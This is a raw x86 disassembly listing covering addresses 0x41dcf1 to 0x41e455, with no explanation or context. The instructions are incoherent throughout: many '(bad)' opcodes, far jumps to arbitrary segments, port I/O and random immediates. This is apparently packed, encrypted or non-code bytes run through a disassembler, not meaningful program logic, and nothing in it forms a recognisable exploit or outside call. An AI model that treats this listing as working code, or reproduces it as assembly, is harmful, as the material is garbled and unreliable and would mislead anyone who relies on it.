  41dcf1:	xchg   edx,eax
  41dcf2:	in     eax,0x32
  41dcf4:	adc    DWORD PTR [eax+ecx*1-0x51],esp
  41dcf8:	mov    edx,0x21f7ead0
  41dcfd:	in     eax,0xb9
  41dcff:	aam    0x6c
  41dd01:	or     dl,BYTE PTR [esi]
  41dd03:	ret    
  41dd04:	sbb    al,0xa5
  41dd06:	into   
  41dd07:	jmp    0x50596246
  41dd0c:	ds and al,0xdd
  41dd0f:	inc    esi
  41dd10:	sbb    DWORD PTR [ebx-0x64],ebp
  41dd13:	loopne 0x41dd60
  41dd15:	inc    ebx
  41dd16:	pusha  
  41dd17:	sub    eax,0x7062472f
  41dd1c:	xchg   ebx,eax
  41dd1d:	xchg   BYTE PTR [eax],ah
  41dd1f:	enter  0xbcdf,0x98
  41dd23:	lods   eax,DWORD PTR ds:[esi]
  41dd24:	jno    0x41dd70
  41dd26:	jmp    0x41dd8f
  41dd28:	push   ds
  41dd29:	ins    BYTE PTR es:[edi],dx
  41dd2a:	or     al,dl
  41dd2c:	pop    esi
  41dd2d:	sub    eax,0x3ff2d262
  41dd32:	push   edi
  41dd33:	std    
  41dd34:	aad    0xc9
  41dd36:	cmp    eax,0xd672ab4c
  41dd3b:	rol    BYTE PTR [ebx],1
  41dd3d:	lock pop eax
  41dd3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd40:	inc    ebp
  41dd41:	jmp    0x522:0x39d6f11f
  41dd48:	pop    eax
  41dd49:	jmp    0x1a10:0x20c4f045
  41dd50:	mov    ds:0x76ee2444,eax
  41dd55:	push   ebx
  41dd56:	lods   eax,DWORD PTR ds:[esi]
  41dd57:	sbb    al,0xed
  41dd59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd5a:	stos   BYTE PTR es:[edi],al
  41dd5b:	inc    esp
  41dd5c:	outs   dx,BYTE PTR ds:[esi]
  41dd5d:	xchg   ebx,eax
  41dd5e:	loope  0x41dd45
  41dd60:	outs   dx,BYTE PTR ds:[esi]
  41dd61:	imul   ecx,DWORD PTR [edi-0x53095858],0x24
  41dd68:	pushf  
  41dd69:	sub    al,0x23
  41dd6b:	std    
  41dd6c:	push   cs
  41dd6d:	push   ebx
  41dd6e:	push   0x91a5d2ae
  41dd73:	mov    ds:0xd926b588,eax
  41dd78:	and    ah,BYTE PTR [ebp+esi*8+0x28]
  41dd7c:	ds adc al,0xe7
  41dd7f:	and    ah,al
  41dd81:	xchg   esp,eax
  41dd82:	sub    BYTE PTR [edi],bh
  41dd84:	ror    dh,cl
  41dd86:	ins    DWORD PTR es:[edi],dx
  41dd87:	and    BYTE PTR [ebx+0x137d3258],dh
  41dd8d:	scas   eax,DWORD PTR es:[edi]
  41dd8e:	dec    edx
  41dd8f:	je     0x41dd12
  41dd91:	lods   al,BYTE PTR ds:[esi]
  41dd92:	jmp    0xcfe90ec5
  41dd97:	loop   0x41dd76
  41dd99:	mov    eax,ds:0x704d55d5
  41dd9e:	pop    ebp
  41dd9f:	jae    0x41dd69
  41dda1:	nop
  41dda2:	pop    ds
  41dda3:	iret   
  41dda4:	pop    es
  41dda5:	pop    es
  41dda6:	mov    esp,0xe9b8c81b
  41ddab:	pop    ebp
  41ddac:	inc    esi
  41ddad:	outs   dx,DWORD PTR ds:[esi]
  41ddae:	pop    esi
  41ddaf:	loop   0x41ddb0
  41ddb1:	jp     0x41ddeb
  41ddb3:	dec    ecx
  41ddb4:	and    ah,BYTE PTR [edx]
  41ddb6:	inc    ebp
  41ddb7:	inc    esi
  41ddb8:	mov    dl,0xf7
  41ddba:	xchg   edi,eax
  41ddbb:	loop   0x41ddd7
  41ddbd:	cli    
  41ddbe:	fmul   st(1),st
  41ddc0:	jno    0x41dd8b
  41ddc2:	test   al,0x9
  41ddc4:	scas   al,BYTE PTR es:[edi]
  41ddc5:	popa   
  41ddc6:	sbb    al,0x68
  41ddc8:	mov    cl,0x41
  41ddca:	(bad)  
  41ddcb:	xlat   BYTE PTR ds:[ebx]
  41ddcc:	and    al,0x6
  41ddce:	sbb    esp,DWORD PTR [esi]
  41ddd0:	fwait
  41ddd1:	sbb    eax,0xe79c3cb
  41ddd6:	mov    bh,0xfa
  41ddd8:	pushf  
  41ddd9:	lods   al,BYTE PTR ds:[esi]
  41ddda:	xor    eax,0x3acc082d
  41dddf:	mov    ds:0xee0660a5,eax
  41dde4:	icebp  
  41dde5:	mov    DWORD PTR [ebx],ebx
  41dde7:	xor    eax,0xd0f65da7
  41ddec:	xchg   edi,eax
  41dded:	mov    bh,0xb8
  41ddef:	or     esi,0x3213df7
  41ddf5:	dec    eax
  41ddf6:	leave  
  41ddf7:	pop    edx
  41ddf8:	xchg   esi,eax
  41ddf9:	mov    ds:0xbca54a9e,eax
  41ddfe:	dec    edi
  41ddff:	xchg   edi,eax
  41de00:	pop    edx
  41de01:	aaa    
  41de02:	repnz inc ecx
  41de04:	iret   
  41de05:	inc    edi
  41de06:	fisub  WORD PTR [edi+0x232bdea5]
  41de0c:	shr    edi,0xa6
  41de0f:	pop    esi
  41de10:	or     ch,dl
  41de12:	mov    ah,0xe7
  41de14:	test   BYTE PTR [edi+0x7f],dl
  41de17:	adc    ebx,esp
  41de19:	push   ds
  41de1a:	lods   al,BYTE PTR ds:[esi]
  41de1b:	fcomi  st,st(1)
  41de1d:	inc    ebp
  41de1e:	ja     0x41de82
  41de20:	das    
  41de21:	das    
  41de22:	arpl   ax,sp
  41de24:	fisttp QWORD PTR [ebx-0x218bfb2d]
  41de2a:	xor    bh,BYTE PTR [eax]
  41de2c:	je     0x41de4d
  41de2e:	jno    0x41de49
  41de30:	push   ecx
  41de31:	jbe    0x41de46
  41de33:	or     dh,dh
  41de35:	dec    eax
  41de36:	arpl   WORD PTR [ebp-0x15],bp
  41de39:	lahf   
  41de3a:	pop    DWORD PTR [ecx]
  41de3c:	hlt    
  41de3d:	dec    ecx
  41de3e:	aad    0x97
  41de40:	add    bh,BYTE PTR [ebp-0x17]
  41de43:	dec    eax
  41de44:	adc    DWORD PTR ds:0x95c2bb10,edi
  41de4a:	cmp    al,0xd4
  41de4c:	and    ah,bl
  41de4e:	js     0x41ddde
  41de50:	jg     0x41de5c
  41de52:	inc    eax
  41de53:	xor    eax,0xe8e31fb
  41de58:	sub    eax,0x43b66716
  41de5d:	adc    edx,eax
  41de5f:	or     eax,0x1ed7b14f
  41de64:	dec    esp
  41de65:	sbb    BYTE PTR [eax-0x44],dl
  41de68:	mov    edx,0x8ca61046
  41de6d:	fwait
  41de6e:	mov    eax,ds:0x5be41e0e
  41de73:	pop    ss
  41de74:	fsubrp st(3),st
  41de76:	es call 0x6be17f4a
  41de7c:	popf   
  41de7d:	loop   0x41de21
  41de7f:	xor    eax,DWORD PTR [eax]
  41de81:	add    BYTE PTR [ebp-0x15b01f1],bl
  41de87:	cmc    
  41de88:	fistp  QWORD PTR [edi]
  41de8a:	stc    
  41de8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de8c:	mov    bl,0x6e
  41de8e:	mov    al,0xa6
  41de90:	push   0xfffffff4
  41de92:	dec    eax
  41de93:	push   ebp
  41de94:	add    DWORD PTR [eax],eax
  41de96:	add    eax,DWORD PTR es:[eax]
  41de99:	add    BYTE PTR [edx],dh
  41de9b:	retf   0xe11b
  41de9e:	cmp    al,0x50
  41dea0:	inc    ebp
  41dea1:	xor    ch,ch
  41dea3:	sub    DWORD PTR [ebp+0x26],ecx
  41dea6:	sbb    bh,dh
  41dea8:	repnz bound ebp,QWORD PTR [eax]
  41deab:	push   es
  41deac:	std    
  41dead:	inc    edi
  41deae:	jbe    0x41de92
  41deb0:	dec    eax
  41deb1:	shl    DWORD PTR [edi],0x94
  41deb4:	sub    al,0x61
  41deb6:	neg    BYTE PTR [ebp-0x190e734a]
  41debc:	push   ds
  41debd:	lds    ebx,FWORD PTR [esi]
  41debf:	es out 0x7d,eax
  41dec2:	into   
  41dec3:	retf   
  41dec4:	mov    DWORD PTR [ebp-0x1e217474],edx
  41deca:	loopne 0x41de8b
  41decc:	sub    ecx,0xd7ab3e3b
  41ded2:	daa    
  41ded3:	das    
  41ded4:	inc    BYTE PTR [eax+0x7f8db94f]
  41deda:	fstp   QWORD PTR [ebx]
  41dedc:	sub    BYTE PTR [edx],0x8d
  41dedf:	adc    DWORD PTR [esp+ebp*8-0x1887b056],0xffffffd2
  41dee7:	outs   dx,BYTE PTR ds:[esi]
  41dee8:	adc    bh,BYTE PTR [ecx+0x8]
  41deeb:	xor    edx,ebx
  41deed:	out    dx,eax
  41deee:	ins    DWORD PTR es:[edi],dx
  41deef:	jmp    0x41df2e
  41def1:	cmp    eax,edx
  41def3:	push   eax
  41def4:	ret    0xc83b
  41def7:	hlt    
  41def8:	fsubr  QWORD PTR [ecx+esi*4-0x42a1ca12]
  41deff:	cmp    eax,0x4e3c7cc3
  41df04:	push   0x33
  41df06:	addr16 aas 
  41df08:	jo     0x41de94
  41df0a:	loopne 0x41df1f
  41df0c:	mov    edi,0xa4971587
  41df11:	lods   al,BYTE PTR ds:[esi]
  41df12:	dec    edi
  41df13:	std    
  41df14:	xor    al,0x92
  41df16:	push   0xdbc4950f
  41df1b:	mov    eax,0x3c9d8d78
  41df20:	inc    ecx
  41df21:	jge    0x41dedc
  41df23:	mov    ds:0xac8edab4,al
  41df28:	xor    edx,DWORD PTR [ebx+0x4b99b3f]
  41df2e:	out    dx,al
  41df2f:	or     BYTE PTR [edx+ebp*8-0x6c],bh
  41df33:	aad    0xdd
  41df35:	ins    BYTE PTR es:[edi],dx
  41df36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df37:	(bad)  
  41df38:	dec    DWORD PTR [edx]
  41df3a:	(bad)  
  41df3b:	(bad)  
  41df3c:	in     al,dx
  41df3d:	inc    ebx
  41df3e:	jbe    0x41df5d
  41df40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df41:	sub    ah,BYTE PTR [eax]
  41df43:	pop    es
  41df44:	push   esp
  41df45:	mov    bl,0x7d
  41df47:	rcl    ah,0x8b
  41df4a:	fidiv  DWORD PTR [eax+0x6366bea7]
  41df50:	jno    0x41df3f
  41df52:	push   esi
  41df53:	fwait
  41df54:	sbb    DWORD PTR [ebx+0x7a8e8478],0xf963df98
  41df5e:	fild   DWORD PTR [ebp+esi*2+0x6e022ecf]
  41df65:	(bad)  [ebp-0x66429b2b]
  41df6b:	push   ds
  41df6c:	cmp    dh,bl
  41df6e:	lds    ecx,FWORD PTR [eax-0x4]
  41df71:	jnp    0x41dfd1
  41df73:	fisttp WORD PTR [edx]
  41df75:	add    eax,0x4ced279
  41df7a:	pop    esp
  41df7b:	adc    BYTE PTR [edi],bh
  41df7d:	and    ebx,esp
  41df7f:	xor    edi,DWORD PTR [edi-0x49c77bfc]
  41df85:	cmp    BYTE PTR [edx+0x646f8a98],ah
  41df8b:	mov    eax,0x3a611292
  41df90:	out    0x2,al
  41df92:	test   eax,0x80e4ef11
  41df97:	lods   eax,DWORD PTR ds:[esi]
  41df98:	adc    dh,BYTE PTR [ecx-0x7d]
  41df9b:	mov    esi,DWORD PTR [eax-0x511cb602]
  41dfa1:	xchg   ebx,eax
  41dfa2:	mov    ds:0x50c11d0a,ax
  41dfa8:	cmc    
  41dfa9:	repnz stos DWORD PTR es:[edi],eax
  41dfab:	sub    al,0xb7
  41dfad:	pop    ecx
  41dfae:	and    eax,DWORD PTR [ebp+0x14]
  41dfb1:	in     al,0x7b
  41dfb3:	add    ch,BYTE PTR [edi-0x6f]
  41dfb6:	inc    DWORD PTR [edx+0x2a3738fe]
  41dfbc:	std    
  41dfbd:	mov    ebp,0xc6b6cf3d
  41dfc2:	aam    0x35
  41dfc4:	or     al,0x7d
  41dfc6:	inc    esp
  41dfc7:	neg    BYTE PTR [eax+eax*2]
  41dfca:	mov    ebp,0x5301b85d
  41dfcf:	mov    eax,ds:0xcbd22696
  41dfd4:	outs   dx,DWORD PTR ds:[esi]
  41dfd5:	sub    DWORD PTR cs:[ebx+0x61dcd103],esi
  41dfdc:	fistp  DWORD PTR [ecx-0x3adc3504]
  41dfe2:	dec    ebx
  41dfe3:	push   ebp
  41dfe4:	dec    edi
  41dfe5:	cmp    ah,BYTE PTR [ebx-0x275a4a50]
  41dfeb:	icebp  
  41dfec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfed:	repnz pop ecx
  41dfef:	jne    0x41df76
  41dff1:	daa    
  41dff2:	push   edx
  41dff3:	dec    edx
  41dff4:	sbb    eax,0x2e959a88
  41dff9:	fimul  DWORD PTR [esp+esi*8]
  41dffc:	add    ecx,edx
  41dffe:	repnz and edi,DWORD PTR [esi]
  41e001:	mov    ds:0x7f74f752,al
  41e006:	xchg   ebp,eax
  41e007:	cli    
  41e008:	mov    eax,ds:0x379177f6
  41e00d:	jns    0x41e006
  41e00f:	std    
  41e010:	add    eax,0x92bc5dcd
  41e015:	add    DWORD PTR [edi-0x8840f36],ecx
  41e01b:	outs   dx,DWORD PTR ds:[esi]
  41e01c:	ficomp DWORD PTR [esi]
  41e01e:	stos   BYTE PTR es:[edi],al
  41e01f:	stos   BYTE PTR es:[edi],al
  41e020:	arpl   WORD PTR [edx+eiz*4-0x608163f7],ax
  41e027:	into   
  41e028:	mov    al,0x15
  41e02a:	adc    dl,BYTE PTR [ecx-0x28]
  41e02d:	mov    al,ds:0x4e27bdfd
  41e032:	imul   edx,DWORD PTR [eax],0xffffffd8
  41e035:	out    0xab,al
  41e037:	xor    ebx,0xffffffa9
  41e03a:	inc    esp
  41e03b:	repnz cwde 
  41e03d:	sub    al,0x4a
  41e03f:	sub    eax,0xed937907
  41e044:	out    dx,eax
  41e045:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e046:	or     edx,ebx
  41e048:	mov    edx,0x12d238d6
  41e04d:	adc    BYTE PTR [edx],bh
  41e04f:	aaa    
  41e050:	inc    esi
  41e051:	inc    esp
  41e052:	and    BYTE PTR [ebx+ebp*8],0x40
  41e056:	retf   0x82
  41e059:	lods   al,BYTE PTR fs:[esi]
  41e05b:	shl    BYTE PTR [edi-0x42],cl
  41e05e:	mov    bl,0xe8
  41e060:	adc    BYTE PTR [ebx-0x58],0xbf
  41e064:	push   es
  41e065:	mov    BYTE PTR [ebx+0x2f],ah
  41e068:	mov    eax,ds:0xd49aa418
  41e06d:	imul   BYTE PTR [ebx+0x579d7dd0]
  41e073:	mov    BYTE PTR [ecx],al
  41e075:	sbb    DWORD PTR [esi+0x73],edx
  41e078:	sub    edx,DWORD PTR [ecx]
  41e07a:	(bad)  
  41e07c:	sbb    eax,0x119318c3
  41e081:	repnz popa 
  41e083:	retf   0xc8f9
  41e086:	xchg   edi,eax
  41e087:	mov    cl,0x7
  41e089:	jp     0x41e084
  41e08b:	in     eax,0xaa
  41e08d:	inc    esp
  41e08e:	sbb    BYTE PTR [esi+0x51bb414f],0x6a
  41e095:	xchg   edi,eax
  41e096:	(bad)  
  41e097:	pop    ss
  41e098:	add    eax,0x241d74b3
  41e09d:	sbb    eax,0x30f73cda
  41e0a2:	ss jg  0x41e070
  41e0a5:	cli    
  41e0a6:	into   
  41e0a7:	xor    esi,DWORD PTR [edi-0x54]
  41e0aa:	fmul   DWORD PTR [ebx]
  41e0ac:	retf   0xbff9
  41e0af:	int    0xe
  41e0b1:	mov    DWORD PTR [ebx+0x39],ebx
  41e0b4:	sub    ebp,DWORD PTR [ebx]
  41e0b6:	push   edi
  41e0b7:	jmp    DWORD PTR [edx+0x41edd50]
  41e0bd:	inc    esi
  41e0be:	sub    eax,0x7426e519
  41e0c3:	fstp   QWORD PTR ss:0x69739363
  41e0ca:	pop    eax
  41e0cb:	xchg   DWORD PTR [esi+ebp*8+0x10],edi
  41e0cf:	pop    ebx
  41e0d0:	mov    al,BYTE PTR [esi-0x4b2300b0]
  41e0d6:	or     BYTE PTR [edx+edx*4],dh
  41e0d9:	and    dl,BYTE PTR [eax-0x15]
  41e0dc:	fcmovnbe st,st(1)
  41e0de:	or     al,0xb2
  41e0e0:	cwde   
  41e0e1:	fnstsw WORD PTR [esi]
  41e0e3:	push   0x78a36947
  41e0e8:	or     BYTE PTR [esi-0x5d33d1ac],bl
  41e0ee:	mov    ds:0x558f048b,al
  41e0f3:	add    ch,BYTE PTR [esi]
  41e0f5:	stos   DWORD PTR es:[edi],eax
  41e0f6:	push   esp
  41e0f7:	addr16 push 0x3f
  41e0fa:	fwait
  41e0fb:	jle    0x41e102
  41e0fd:	arpl   WORD PTR [ebx-0xcafc5aa],ax
  41e103:	icebp  
  41e104:	push   cs
  41e105:	ins    BYTE PTR es:[edi],dx
  41e106:	mov    ds:0xbb0d2ad0,al
  41e10b:	cmp    eax,0xf0274c63
  41e110:	cmp    BYTE PTR [edi-0x47],0x3d
  41e114:	shr    BYTE PTR [edi],1
  41e116:	and    DWORD PTR ds:0xb92d34e0,esp
  41e11c:	std    
  41e11d:	fcmovnbe st,st(4)
  41e11f:	push   0x25e77551
  41e124:	bound  edx,QWORD PTR [edx-0x3374484b]
  41e12a:	xchg   edi,eax
  41e12b:	call   DWORD PTR [edi]
  41e12d:	and    DWORD PTR [edi],edx
  41e12f:	fstp   TBYTE PTR [edi]
  41e131:	push   0x3c4ab26a
  41e136:	fdiv   QWORD PTR ds:0xe9e822ce
  41e13c:	push   edi
  41e13d:	sti    
  41e13e:	stos   DWORD PTR es:[edi],eax
  41e13f:	inc    edx
  41e140:	push   ebx
  41e141:	cmp    esi,DWORD PTR [edi]
  41e143:	jp     0x41e16d
  41e145:	adc    BYTE PTR [ebp+0x44],al
  41e148:	sbb    bh,BYTE PTR [esi-0x433f3925]
  41e14e:	dec    esp
  41e14f:	shr    BYTE PTR [esi+0x136ef6ff],1
  41e155:	mov    BYTE PTR [esi-0x70ffa5b4],cl
  41e15b:	push   ss
  41e15c:	repnz adc bl,cl
  41e15f:	sub    al,0x85
  41e161:	jmp    0x8037:0xef7367cd
  41e168:	cmp    eax,0xbb32a900
  41e16d:	aam    0x1c
  41e16f:	ret    0xa46
  41e172:	jg     0x41e16b
  41e174:	mov    al,ds:0x72a1b189
  41e179:	jmp    0x41e1e8
  41e17b:	loopne 0x41e178
  41e17d:	imul   eax,DWORD PTR [eax-0x56],0xffffffa9
  41e181:	adc    bh,al
  41e183:	mov    bl,0x4
  41e185:	fisttp DWORD PTR [eax]
  41e187:	call   0xaed8d8ae
  41e18c:	dec    ebx
  41e18d:	sbb    edx,edx
  41e18f:	jecxz  0x41e20a
  41e191:	stos   DWORD PTR es:[edi],eax
  41e192:	xchg   edi,eax
  41e193:	aaa    
  41e194:	xor    ah,BYTE PTR [edi-0x2cd1899d]
  41e19a:	mov    al,0x1b
  41e19c:	sub    eax,0x9a2a70f2
  41e1a1:	frstor [esi-0x6c]
  41e1a4:	pop    esi
  41e1a5:	sbb    DWORD PTR [esp+ebp*8+0x75fe3ba3],ebx
  41e1ac:	mov    eax,ds:0xb506b9ae
  41e1b1:	xor    BYTE PTR [ebx+edx*1],ch
  41e1b4:	dec    eax
  41e1b5:	gs out 0xb2,al
  41e1b8:	bound  ecx,QWORD PTR ds:0x7706a555
  41e1be:	cmp    dh,dh
  41e1c0:	add    BYTE PTR [eax],al
  41e1c2:	and    BYTE PTR [esi],dl
  41e1c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1c5:	lea    esi,[esi+0x25bf29bf]
  41e1cb:	lods   eax,DWORD PTR ds:[esi]
  41e1cc:	and    dl,al
  41e1ce:	push   0x6e314797
  41e1d3:	pop    eax
  41e1d4:	add    DWORD PTR [eax],eax
  41e1d6:	add    eax,DWORD PTR es:[eax]
  41e1d9:	add    BYTE PTR [edx],bl
  41e1db:	out    0x19,eax
  41e1dd:	add    eax,0x7647c8a2
  41e1e2:	mov    DWORD PTR [edi-0x1d],0xef723bdf
  41e1e9:	jno    0x41e22b
  41e1eb:	ja     0x41e217
  41e1ed:	je     0x41e193
  41e1ef:	(bad)  
  41e1f0:	push   ss
  41e1f1:	xchg   edx,eax
  41e1f2:	bnd jae 0x41e181
  41e1f5:	stos   DWORD PTR es:[edi],eax
  41e1f6:	add    al,BYTE PTR [esi]
  41e1f8:	fucomi st,st(7)
  41e1fa:	loopne 0x41e267
  41e1fc:	rcl    DWORD PTR [esi+0x293e6b51],0xd6
  41e203:	ins    DWORD PTR es:[edi],dx
  41e204:	mov    edi,DWORD PTR [ecx-0x1a]
  41e207:	jp     0x41e1ec
  41e209:	jle    0x41e1a4
  41e20b:	jl     0x41e28b
  41e20d:	rcl    DWORD PTR ds:0xd59bd190,cl
  41e213:	daa    
  41e214:	dec    edx
  41e215:	cdq    
  41e216:	pop    ds
  41e217:	shl    BYTE PTR [edx],cl
  41e219:	jmp    0x7d4576be
  41e21e:	dec    ebp
  41e21f:	xchg   BYTE PTR [ebp+0x4b],cl
  41e222:	jl     0x41e1d8
  41e224:	lds    ebx,FWORD PTR ds:0x1b414984
  41e22a:	push   esp
  41e22b:	shl    DWORD PTR [edi+0x3b],1
  41e22e:	fld    QWORD PTR [ebx-0x1c]
  41e231:	dec    esp
  41e232:	cmp    eax,0x2fb9226b
  41e237:	sbb    al,0x4b
  41e239:	repz cs xchg esi,eax
  41e23c:	ja     0x41e247
  41e23e:	sbb    eax,eax
  41e240:	sbb    ebx,eax
  41e242:	push   edi
  41e243:	dec    ebx
  41e244:	dec    ebp
  41e245:	cmp    dl,BYTE PTR [ecx+0x3a]
  41e248:	or     al,0x30
  41e24a:	out    dx,al
  41e24b:	cs inc ebp
  41e24d:	in     eax,dx
  41e24e:	aaa    
  41e24f:	bnd jns 0x41e260
  41e252:	fcom   QWORD PTR [edx+0x6d]
  41e255:	xor    eax,0x7d53a265
  41e25a:	shl    BYTE PTR [ecx-0x421c39a],0xa3
  41e261:	pusha  
  41e262:	adc    esi,DWORD PTR [esi-0x5]
  41e265:	retf   
  41e266:	pop    eax
  41e267:	repnz icebp 
  41e269:	ret    
  41e26a:	add    bh,BYTE PTR [edi]
  41e26c:	mov    DWORD PTR [ebp+0x7b],ecx
  41e26f:	je     0x41e25f
  41e271:	sub    BYTE PTR gs:[edi+0x3a74dbe5],al
  41e278:	fwait
  41e279:	(bad)  
  41e27a:	je     0x41e2e5
  41e27c:	shl    BYTE PTR [esi-0x2970451d],1
  41e282:	cmp    esi,0xffffff9f
  41e285:	dec    edx
  41e286:	dec    ebp
  41e287:	outs   dx,DWORD PTR ds:[esi]
  41e288:	xor    eax,0x2baae6c
  41e28d:	fdiv   QWORD PTR [esi+0xc03a5bc]
  41e293:	inc    esi
  41e294:	add    ecx,eax
  41e296:	adc    eax,0xad46adb4
  41e29b:	sub    eax,0x2826a163
  41e2a0:	xor    BYTE PTR [ecx+0x7f77954b],0x12
  41e2a7:	sbb    dl,BYTE PTR [edi-0x60b1318b]
  41e2ad:	dec    esp
  41e2ae:	rol    BYTE PTR [ebx+0x3d],cl
  41e2b1:	loope  0x41e2c6
  41e2b3:	fidivr WORD PTR [esi-0x5f]
  41e2b6:	mov    eax,ds:0xcc9940f7
  41e2bb:	mov    ch,0x84
  41e2bd:	or     eax,0xacc9f1b8
  41e2c2:	xchg   DWORD PTR [edi-0x69bd2d79],edx
  41e2c8:	mov    bh,BYTE PTR [ecx-0x49]
  41e2cb:	mov    es,WORD PTR [edx]
  41e2cd:	adc    BYTE PTR [esi],bh
  41e2cf:	dec    ebx
  41e2d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2d1:	ds xchg dl,dl
  41e2d4:	shl    cl,cl
  41e2d6:	sub    BYTE PTR [edi+eiz*8+0x26],dl
  41e2da:	push   esp
  41e2db:	add    eax,0xe69e1fbd
  41e2e0:	(bad)  
  41e2e1:	cmc    
  41e2e2:	push   ebp
  41e2e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2e4:	and    cl,BYTE PTR ds:[edi+ebp*2-0x1d57a010]
  41e2ec:	sub    ch,BYTE PTR [eax]
  41e2ee:	xor    eax,0xd2b69ce5
  41e2f3:	sahf   
  41e2f4:	shl    BYTE PTR [ebx+edi*4],0x76
  41e2f8:	dec    ecx
  41e2f9:	gs fwait
  41e2fb:	add    al,0x4
  41e2fd:	pop    edx
  41e2fe:	sub    BYTE PTR [edx-0x73098e84],cl
  41e304:	das    
  41e305:	xlat   BYTE PTR ds:[ebx]
  41e306:	xor    esi,DWORD PTR [ecx-0x18]
  41e309:	dec    BYTE PTR [ecx+eax*2]
  41e30c:	leave  
  41e30d:	sub    cl,BYTE PTR [ebp+0x28]
  41e310:	sti    
  41e311:	jg     0x41e36a
  41e313:	or     esp,DWORD PTR [ebp-0x4e]
  41e316:	jp     0x41e2c3
  41e318:	pushf  
  41e319:	outs   dx,DWORD PTR ds:[esi]
  41e31a:	and    eax,0x87d85451
  41e31f:	mov    edi,edi
  41e321:	dec    ebx
  41e322:	scas   eax,DWORD PTR es:[edi]
  41e323:	in     eax,dx
  41e324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e325:	bound  esp,QWORD PTR [ecx]
  41e327:	das    
  41e328:	lods   eax,DWORD PTR ds:[esi]
  41e329:	sahf   
  41e32a:	xor    eax,0xcc6632c1
  41e32f:	sti    
  41e330:	fild   DWORD PTR ds:0x65cf88f8
  41e336:	les    ecx,FWORD PTR [edi+esi*1-0x4a]
  41e33a:	ror    edi,0xe4
  41e33d:	jmp    0x664b70ef
  41e342:	cdq    
  41e343:	clc    
  41e344:	hlt    
  41e345:	inc    ebx
  41e346:	in     eax,dx
  41e347:	gs repz dec ebx
  41e34a:	xor    BYTE PTR [eax+0x29aec00e],dl
  41e350:	jno    0x41e36c
  41e352:	push   cs
  41e353:	js     0x41e385
  41e355:	leave  
  41e356:	lods   eax,DWORD PTR ds:[esi]
  41e357:	test   BYTE PTR [ebp+eiz*1+0x7947e525],dl
  41e35e:	mov    dh,BYTE PTR [ebx+ebx*4]
  41e361:	(bad)  
  41e362:	lods   al,BYTE PTR ds:[esi]
  41e363:	daa    
  41e364:	jecxz  0x41e333
  41e366:	and    al,0xf0
  41e368:	or     ch,BYTE PTR es:[esi+ebp*1-0x35f6a36a]
  41e370:	cmp    eax,0x542d6d39
  41e375:	mov    edi,0x7eb30316
  41e37a:	loopne 0x41e3f3
  41e37c:	(bad)  
  41e37d:	or     al,0xb4
  41e37f:	daa    
  41e380:	push   ss
  41e381:	xchg   edi,eax
  41e382:	dec    edi
  41e383:	adc    al,0x5
  41e385:	(bad)  
  41e386:	xchg   ebx,eax
  41e387:	inc    eax
  41e388:	daa    
  41e389:	mov    ch,0x3c
  41e38b:	jmp    0x4c70cf76
  41e390:	push   esi
  41e391:	mov    DWORD PTR [ecx],edx
  41e393:	iret   
  41e394:	pusha  
  41e395:	cmp    dh,cl
  41e397:	sbb    dh,ch
  41e399:	or     BYTE PTR [eax+0x4],cl
  41e39c:	pop    ebp
  41e39d:	pop    ebx
  41e39e:	add    BYTE PTR [eax-0x6],0x8c
  41e3a2:	(bad)  
  41e3a3:	enter  0x2fe0,0x32
  41e3a7:	pusha  
  41e3a8:	or     al,0x15
  41e3aa:	ja     0x41e3b2
  41e3ac:	mov    al,ds:0xac412dde
  41e3b1:	mov    edx,0xd82da3e8
  41e3b6:	cdq    
  41e3b7:	out    dx,eax
  41e3b8:	xchg   ebp,eax
  41e3b9:	dec    edx
  41e3ba:	sar    BYTE PTR [eax+0x1c],1
  41e3bd:	push   edx
  41e3be:	cdq    
  41e3bf:	jb     0x41e425
  41e3c1:	outs   dx,BYTE PTR ds:[esi]
  41e3c2:	mov    dh,0xb1
  41e3c4:	neg    DWORD PTR [eax]
  41e3c6:	adc    eax,0x6f20ebf1
  41e3cb:	aaa    
  41e3cc:	bound  ecx,QWORD PTR [esi]
  41e3ce:	shl    BYTE PTR [edx+0x37753aac],cl
  41e3d4:	imul   ebp,DWORD PTR [ecx],0xe6ae8888
  41e3da:	cmc    
  41e3db:	sahf   
  41e3dc:	or     eax,esp
  41e3de:	aas    
  41e3df:	mov    cx,0x392c
  41e3e3:	cmp    cl,BYTE PTR [edi+0xc]
  41e3e6:	pushf  
  41e3e7:	xor    eax,0x95c0aeb4
  41e3ec:	loop   0x41e406
  41e3ee:	shl    BYTE PTR [esi+0xaac57fa],1
  41e3f4:	lahf   
  41e3f5:	pop    ebp
  41e3f6:	xor    eax,0xcd6fb17c
  41e3fb:	pop    ds
  41e3fc:	ror    DWORD PTR [eax+ebx*8],0x33
  41e400:	std    
  41e401:	push   es
  41e402:	or     dh,dh
  41e404:	call   0xdf6d:0x9e23e17
  41e40b:	aad    0x33
  41e40d:	cmc    
  41e40e:	pop    ds
  41e40f:	add    al,BYTE PTR [esi-0x61]
  41e412:	scas   eax,DWORD PTR es:[edi]
  41e413:	popf   
  41e414:	add    BYTE PTR ds:[ebx-0x32cc7bfb],dh
  41e41b:	icebp  
  41e41c:	adc    al,BYTE PTR [esi+0x1a01dde5]
  41e422:	sub    al,0x42
  41e424:	fld    QWORD PTR [ebx]
  41e426:	icebp  
  41e427:	sti    
  41e428:	add    eax,0x330d0cc1
  41e42d:	inc    eax
  41e42e:	test   BYTE PTR [ecx-0x3210a65b],al
  41e434:	dec    edx
  41e435:	mov    WORD PTR [ebx+ebx*8+0x1a97d80d],fs
  41e43c:	fimul  WORD PTR [esi]
  41e43e:	mov    ebp,0x28537497
  41e443:	aad    0x4
  41e445:	loop   0x41e4a6
  41e447:	push   ebx
  41e449:	and    DWORD PTR ss:[ebp+0x63],ebp
  41e44d:	call   0xcf53:0xb463ae07
  41e454:	lods   eax,DWORD PTR ds:[esi]
  41e455:	setns  BYTE PTR [ebp+0x396199f2]
